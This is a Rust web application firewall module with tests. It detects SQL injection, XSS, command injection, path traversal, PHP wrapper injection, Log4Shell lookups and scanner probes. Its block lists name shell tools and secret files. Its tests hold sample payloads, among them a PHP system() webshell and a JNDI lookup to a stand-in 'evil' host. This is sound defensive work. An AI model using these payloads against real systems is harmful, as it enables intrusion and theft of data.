//! Request inspection (`[[site]] waf = "detect" | "block"`).
//!
//! A small, fast layer against the attacks that hit every public site:
//! SQL injection and XSS (libinjection's tokenizers, pure Rust), command
//! injection, path traversal, PHP code and stream-wrapper injection,
//! Log4Shell-style lookups, probes for secret files, and known attack
//! scanners. It inspects the decoded query string, urlencoded form fields,
//! JSON string values (SQL injection only: CMS editors post HTML), headers
//! that carry input, and the path. Each check is chosen for very few false
//! positives on ordinary traffic (tested against WordPress logins, comments,
//! the block editor's REST calls and Laravel forms); nothing here scores or
//! learns, a request either matches a rule or it does not.
//!
//! `detect` logs matches (target `nova::waf`) and counts them; `block`
//! also answers `403`.

use nova_config::WafMode;

/// Bodies larger than this are not inspected (they pass in `detect` and
/// `block` alike; PHP's own limits still apply).
pub const MAX_BODY: usize = 256 * 1024;

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Finding {
    pub rule: &'static str,
    /// Where: `query:id`, `form:user`, `json`, `header:user-agent`, `path`.
    pub target: String,
}

/// Scanners and attack tools that announce themselves.
const SCANNERS: &[&str] = &[
    "sqlmap",
    "nikto",
    "nuclei",
    "acunetix",
    "nessus",
    "netsparker",
    "openvas",
    "masscan",
    "zgrab",
    "dirbuster",
    "gobuster",
    "wfuzz",
    "ffuf",
    "w3af",
    "arachni",
    "havij",
    "jaeles",
    "commix",
    "xsstrike",
];

/// Paths only an attacker asks for (secrets, VCS metadata, backups).
const SECRET_PATHS: &[&str] = &[
    "/.env",
    "/.git/",
    "/.svn/",
    "/.hg/",
    "/.aws/",
    "/.ssh/",
    "/.htpasswd",
    "/.DS_Store",
    "/wp-config.php~",
    "/wp-config.php.bak",
    "/wp-config.php.old",
    "/wp-config.php.save",
    "/wp-config.php.orig",
    "/wp-config.php.swp",
    "/.wp-config.php.swp",
    "/config.php.bak",
    "/server-status",
    "/etc/passwd",
    "/proc/self/environ",
];

const SHELL_COMMANDS: &[&str] = &[
    "cat",
    "id",
    "uname",
    "whoami",
    "wget",
    "curl",
    "nc",
    "ncat",
    "bash",
    "sh",
    "zsh",
    "ls",
    "rm",
    "chmod",
    "python",
    "python3",
    "perl",
    "php",
    "busybox",
    "powershell",
    "cmd",
];

/// Inspect one request; the first finding is enough.
pub fn inspect(
    path: &str,
    query: &str,
    headers: &http::HeaderMap,
    body: Option<(&[u8], BodyKind)>,
) -> Option<Finding> {
    let lower_path = path.to_ascii_lowercase();
    if let Some(p) = SECRET_PATHS.iter().find(|p| {
        lower_path == p.trim_end_matches('/')
            || lower_path.starts_with(*p)
            || lower_path.ends_with(p.trim_end_matches('/'))
    }) {
        let _ = p;
        return finding("secret-file-probe", "path");
    }
    if let Some(r) = check_value(&percent_decode(path.as_bytes()), true) {
        // Only traversal and wrappers make sense in a path.
        if matches!(r, "path-traversal" | "php-injection") {
            return finding(r, "path");
        }
    }
    for (k, v) in form_pairs(query.as_bytes()) {
        if let Some(r) = check_value(&k, false).or_else(|| check_value(&v, true)) {
            return finding(r, &format!("query:{}", truncate(&k)));
        }
    }
    if let Some(ua) = headers
        .get(http::header::USER_AGENT)
        .and_then(|v| v.to_str().ok())
    {
        let ua = ua.to_ascii_lowercase();
        if SCANNERS.iter().any(|s| ua.contains(s)) {
            return finding("scanner", "header:user-agent");
        }
    }
    for (name, value) in headers {
        let v = value.as_bytes();
        if is_lookup_injection(v) {
            return finding("log4shell", &format!("header:{name}"));
        }
        // Input-carrying headers some applications echo or query with.
        if matches!(name.as_str(), "referer" | "user-agent" | "x-forwarded-host")
            && let Some(r @ ("php-injection" | "command-injection")) = check_value(v, false)
        {
            return finding(r, &format!("header:{name}"));
        }
    }
    match body {
        Some((b, BodyKind::Form)) => {
            for (k, v) in form_pairs(b) {
                if let Some(r) = check_value(&k, false).or_else(|| check_value(&v, true)) {
                    return finding(r, &format!("form:{}", truncate(&k)));
                }
            }
        }
        Some((b, BodyKind::Json)) => {
            if let Ok(v) = serde_json::from_slice::<serde_json::Value>(b) {
                let mut found = None;
                walk_json(&v, &mut |s| {
                    if found.is_none() {
                        found = check_value(s.as_bytes(), false);
                    }
                });
                if let Some(r) = found {
                    return finding(r, "json");
                }
            }
        }
        None => {}
    }
    None
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum BodyKind {
    Form,
    Json,
}

/// The body kinds worth buffering for inspection.
pub fn body_kind(content_type: &str) -> Option<BodyKind> {
    let mime = content_type.split(';').next()?.trim().to_ascii_lowercase();
    match mime.as_str() {
        "application/x-www-form-urlencoded" => Some(BodyKind::Form),
        "application/json" => Some(BodyKind::Json),
        m if m.ends_with("+json") => Some(BodyKind::Json),
        _ => None,
    }
}

fn finding(rule: &'static str, target: &str) -> Option<Finding> {
    Some(Finding {
        rule,
        target: target.to_string(),
    })
}

fn truncate(s: &[u8]) -> String {
    String::from_utf8_lossy(&s[..s.len().min(64)]).into_owned()
}

/// Rules for one decoded value. `xss`: also look for script injection
/// (not for JSON, where rich text is normal).
fn check_value(v: &[u8], xss: bool) -> Option<&'static str> {
    if v.len() < 3 {
        return None;
    }
    let lower = v.to_ascii_lowercase();
    if is_lookup_injection(v) {
        return Some("log4shell");
    }
    if contains(&lower, b"<?php")
        || contains(&lower, b"<?=")
        || [
            &b"php://"[..],
            b"phar://",
            b"expect://",
            b"data://text",
            b"zip://",
        ]
        .iter()
        .any(|w| lower.starts_with(w))
    {
        return Some("php-injection");
    }
    if is_traversal(&lower) {
        return Some("path-traversal");
    }
    if is_command_injection(&lower) {
        return Some("command-injection");
    }
    if libinjectionrs::detect_sqli(v).is_injection() {
        return Some("sql-injection");
    }
    if xss
        && (libinjectionrs::detect_xss(v).is_injection()
            || lower.trim_ascii_start().starts_with(b"javascript:"))
    {
        return Some("xss");
    }
    None
}

fn contains(hay: &[u8], needle: &[u8]) -> bool {
    memchr::memmem::find(hay, needle).is_some()
}

/// `${jndi:...}` and its obfuscations (`${${lower:j}ndi:`, `${::-j}`).
fn is_lookup_injection(v: &[u8]) -> bool {
    let Some(i) = memchr::memmem::find(v, b"${") else {
        return false;
    };
    let rest = v[i..].to_ascii_lowercase();
    [
        "jndi", "${lower:", "${upper:", "${::-", "${env:", "${sys:", "${date:",
    ]
    .iter()
    .any(|m| contains(&rest, m.as_bytes()))
}

fn is_traversal(lower: &[u8]) -> bool {
    let norm: Vec<u8> = lower
        .iter()
        .map(|&b| if b == b'\\' { b'/' } else { b })
        .collect();
    memchr::memmem::find_iter(&norm, b"../").count() >= 2
        || contains(&norm, b"/etc/passwd")
        || contains(&norm, b"/etc/shadow")
        || contains(&norm, b"/proc/self/")
        || contains(&norm, b"/windows/win.ini")
        || contains(&norm, b"boot.ini")
}

/// A shell metacharacter followed by a command: `;cat /etc`, `|id`,
/// `$(whoami)`, `` `uname` ``, `&& wget`.
fn is_command_injection(lower: &[u8]) -> bool {
    for (i, &b) in lower.iter().enumerate() {
        let start = match b {
            b';' | b'|' | b'`' => i + 1,
            b'&' if lower.get(i + 1) == Some(&b'&') => i + 2,
            b'$' if lower.get(i + 1) == Some(&b'(') => i + 2,
            b'\n' => i + 1,
            _ => continue,
        };
        let word: Vec<u8> = lower[start.min(lower.len())..]
            .iter()
            .skip_while(|c| c.is_ascii_whitespace())
            .take_while(|c| c.is_ascii_alphanumeric() || **c == b'/' || **c == b'.')
            .copied()
            .collect();
        let cmd = word.rsplit(|&c| c == b'/').next().unwrap_or(&word);
        if !cmd.is_empty() && SHELL_COMMANDS.iter().any(|s| s.as_bytes() == cmd) {
            // `;id` alone is common in ordinary text only without arguments
            // or a path before it; require a path, an argument or `$(`/`` ` ``.
            let tail = &lower[start.min(lower.len())..];
            let structured = word.contains(&b'/')
                || tail
                    .iter()
                    .skip_while(|c| c.is_ascii_whitespace())
                    .nth(word.len())
                    == Some(&b' ')
                || matches!(b, b'`' | b'$');
            if structured {
                return true;
            }
        }
    }
    false
}

fn walk_json(v: &serde_json::Value, f: &mut impl FnMut(&str)) {
    match v {
        serde_json::Value::String(s) => f(s),
        serde_json::Value::Array(a) => a.iter().for_each(|x| walk_json(x, f)),
        serde_json::Value::Object(o) => o.iter().for_each(|(k, x)| {
            f(k);
            walk_json(x, f)
        }),
        _ => {}
    }
}

/// Decoded `key=value` pairs of a query string or urlencoded body.
fn form_pairs(s: &[u8]) -> impl Iterator<Item = (Vec<u8>, Vec<u8>)> + '_ {
    s.split(|&b| b == b'&').filter(|p| !p.is_empty()).map(|p| {
        let (k, v) = match p.iter().position(|&b| b == b'=') {
            Some(i) => (&p[..i], &p[i + 1..]),
            None => (p, &b""[..]),
        };
        (percent_decode(k), percent_decode(v))
    })
}

fn percent_decode(s: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(s.len());
    let mut i = 0;
    while i < s.len() {
        match s[i] {
            b'+' => out.push(b' '),
            b'%' if i + 2 < s.len() => {
                let h = |c: u8| (c as char).to_digit(16);
                match (h(s[i + 1]), h(s[i + 2])) {
                    (Some(a), Some(b)) => {
                        out.push((a * 16 + b) as u8);
                        i += 2;
                    }
                    _ => out.push(b'%'),
                }
            }
            b => out.push(b),
        }
        i += 1;
    }
    out
}

pub fn active(mode: WafMode) -> bool {
    mode != WafMode::Off
}

#[cfg(test)]
mod tests {
    use super::*;

    fn hdr(pairs: &[(&str, &str)]) -> http::HeaderMap {
        let mut h = http::HeaderMap::new();
        for (k, v) in pairs {
            h.append(
                http::HeaderName::from_bytes(k.as_bytes()).unwrap(),
                v.parse().unwrap(),
            );
        }
        h
    }

    const UA: (&str, &str) = ("user-agent", "Mozilla/5.0 (X11; Linux x86_64) Chrome/141.0");

    #[test]
    fn attacks_are_found() {
        let h = hdr(&[UA]);
        let rule = |path: &str, query: &str| inspect(path, query, &h, None).map(|f| f.rule);
        assert_eq!(
            rule("/", "id=1%27%20OR%20%271%27=%271"),
            Some("sql-injection")
        );
        assert_eq!(
            rule("/p", "id=1+UNION+SELECT+username,password+FROM+users--"),
            Some("sql-injection")
        );
        assert_eq!(
            rule("/", "q=%3Cscript%3Ealert(1)%3C/script%3E"),
            Some("xss")
        );
        assert_eq!(rule("/", "next=javascript:alert(1)"), Some("xss"));
        assert_eq!(
            rule("/d", "file=../../../../etc/passwd"),
            Some("path-traversal")
        );
        assert_eq!(
            rule("/ping", "host=127.0.0.1;cat%20/etc/hosts"),
            Some("command-injection")
        );
        assert_eq!(rule("/ping", "host=$(whoami)"), Some("command-injection"));
        assert_eq!(
            rule(
                "/",
                "page=php://filter/convert.base64-encode/resource=index"
            ),
            Some("php-injection")
        );
        assert_eq!(rule("/.env", ""), Some("secret-file-probe"));
        assert_eq!(rule("/.git/config", ""), Some("secret-file-probe"));
        assert_eq!(rule("/wp-config.php.bak", ""), Some("secret-file-probe"));
        let lookup = hdr(&[UA, ("x-api-version", "${${lower:j}ndi:ldap://evil/a}")]);
        assert_eq!(
            inspect("/", "", &lookup, None).map(|f| f.rule),
            Some("log4shell")
        );
        let scanner = hdr(&[("user-agent", "sqlmap/1.8#stable (https://sqlmap.org)")]);
        assert_eq!(
            inspect("/", "", &scanner, None).map(|f| f.target),
            Some("header:user-agent".into())
        );
        let body = |b: &str, k| inspect("/x", "", &h, Some((b.as_bytes(), k))).map(|f| f.rule);
        assert_eq!(
            body("user=admin%27--&pass=x", BodyKind::Form),
            Some("sql-injection")
        );
        assert_eq!(
            body(
                "text=%3C%3Fphp+system(%24_GET%5B%27c%27%5D)%3B+%3F%3E",
                BodyKind::Form
            ),
            Some("php-injection")
        );
        assert_eq!(
            body(r#"{"q":"1' OR '1'='1"}"#, BodyKind::Json),
            Some("sql-injection")
        );
    }

    #[test]
    fn ordinary_traffic_passes() {
        let h = hdr(&[
            UA,
            ("referer", "https://shop.example.com/?s=o%27reilly"),
            ("cookie", "wordpress_logged_in_abc=admin%7C1791%7Cxyz"),
        ]);
        for (path, query) in [
            ("/", ""),
            ("/", "p=1"),
            ("/", "s=o%27reilly+books"),
            ("/", "s=rock+%27n%27+roll+--+the+best"),
            ("/search", "q=select+good+books+from+the+library"),
            (
                "/",
                "utm_source=newsletter&utm_campaign=autumn-sale&fbclid=IwAR0x",
            ),
            ("/build/assets/app-Bx7Kq2Lm.js", ""),
            ("/wp-content/themes/t/style.css", "ver=7.1.3"),
            ("/redirect", "to=https%3A%2F%2Fexample.com%2Fa%3Fb%3D1"),
            ("/math", "expr=1-2+of+3%3B+4+%3D+5"),
            ("/notes", "text=meet+at+5;+bring+cat+food"),
        ] {
            assert_eq!(inspect(path, query, &h, None), None, "{path}?{query}");
        }
        for (b, k) in [
            (
                "log=admin&pwd=S3cret%21pass&rememberme=forever&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1",
                BodyKind::Form,
            ),
            (
                "comment=Great+post%21+I+tried+it+with+a+%3Cb%3Ebold%3C%2Fb%3E+word.&author=Jo&email=jo%40example.com&comment_post_ID=1",
                BodyKind::Form,
            ),
            (
                "data%5Bwp-refresh-post-lock%5D%5Bpost_id%5D=12&interval=60&_nonce=a1b2c3d4e5&action=heartbeat",
                BodyKind::Form,
            ),
            (
                "_token=K8s9d0fJ2kL&name=Jo+Smith&bio=I+love+SQL+and+select+good+books",
                BodyKind::Form,
            ),
            (
                r#"{"title":"Hello","content":"<!-- wp:paragraph --><p>Text with a <a href=\"https://example.com\">link</a> and <script>-free</p><!-- /wp:paragraph -->","status":"publish"}"#,
                BodyKind::Json,
            ),
            (
                r#"{"items":[{"sku":"A-1","qty":2}],"note":"Tom's diner (\"best\") 50% off"}"#,
                BodyKind::Json,
            ),
        ] {
            assert_eq!(inspect("/x", "", &h, Some((b.as_bytes(), k))), None, "{b}");
        }
    }
}
